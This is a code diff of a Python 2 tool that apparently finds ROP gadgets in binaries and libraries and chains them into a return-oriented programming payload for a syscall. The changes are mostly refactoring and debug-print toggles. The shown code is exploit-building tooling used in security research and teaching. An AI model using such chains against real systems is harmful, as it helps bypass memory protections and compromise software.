@@ -300,23 +300,28 @@ def build_rop_chain_libc_syscalls(entry):
     dec_eax_addr = pack_value(entry[1] + find_dec_eax(entry[0]))
     rop_payload += dec_eax_addr
 
-    rop_payload += pack_value(entry[1] + find_and_eax_x1000(entry[0]))
+    and_eax_x1000_addr = pack_value(entry[1] + find_and_eax_x1000(entry[0]))
+    rop_payload += and_eax_x1000_addr
 
-    rop_payload += pack_value(entry[1] + find_mov_ecx_eax(entry[0]))
+    mov_ecx_eax_addr = pack_value(entry[1] + find_mov_ecx_eax(entry[0]))
+    rop_payload += mov_ecx_eax_addr
     rop_payload += 4 * pack_value(0x11111111)
 
     rop_payload += xor_eax_addr
 
-    rop_payload += pack_value(entry[1] + find_mov_edx_eax(entry[0]))
+    mov_edx_eax_addr = pack_value(entry[1] + find_mov_edx_eax(entry[0]))
+    rop_payload += mov_edx_eax_addr
     rop_payload += 3 * pack_value(0x11111111)
 
-    rop_payload += pack_value(entry[1] + find_push_esp_pop_ebx(entry[0]))
+    push_esp_addr = pack_value(entry[1] + find_push_esp_pop_ebx(entry[0]))
+    rop_payload += push_esp_addr
     rop_payload += pack_value(0x11111111)
 
     xchg_eax_ebx_addr = pack_value(entry[1] + find_xchg_eax_ebx(entry[0]))
     rop_payload += xchg_eax_ebx_addr
 
-    rop_payload += pack_value(entry[1] + find_and_eax_xfffff000(entry[0]))
+    and_eax_xff_addr = pack_value(entry[1] + find_and_eax_xfffff000(entry[0]))
+    rop_payload += and_eax_xff_addr
     rop_payload += pack_value(0x11111111)
 
     rop_payload += xchg_eax_ebx_addr
@@ -326,7 +331,8 @@ def build_rop_chain_libc_syscalls(entry):
     inc_eax_addr = pack_value(entry[1] + find_inc_eax(entry[0]))
     rop_payload += 7 * inc_eax_addr
 
-    rop_payload += pack_value(entry[1] + find_xchg_eax_edx(entry[0]))
+    xchg_eax_edx_addr = pack_value(entry[1] + find_xchg_eax_edx(entry[0]))
+    rop_payload += xchg_eax_edx_addr
 
     add_eax_x20_addr = pack_value(entry[1] + find_add_eax_x20(entry[0]))
     rop_payload += 4 * (add_eax_x20_addr + 2 * pack_value(0x11111111))
@@ -464,7 +470,7 @@ def get_binary_instr(filename):
             find_gadgets(finiSection, finiStartAddr, gadget_map, unique_gadget_map)
 
         disassembled_map = build_disassembled_gadgets_map(unique_gadget_map)
-        #print_gadgets(unique_gadget_map)
+        print_gadgets(unique_gadget_map)
         print str(len(unique_gadget_map)) + " unique gadgets found." 
         return disassembled_map
     return None 
@@ -501,7 +507,6 @@ if __name__ == '__main__':
         #print 'Optional libraries provided are %s' %(args.lib)
         libraries = args.lib.split(' ')
         for entry in libraries:
-            print entry
             disas_map = get_binary_instr(entry)
             if disas_map == None:
                 print '%s library not present !' %(entry)
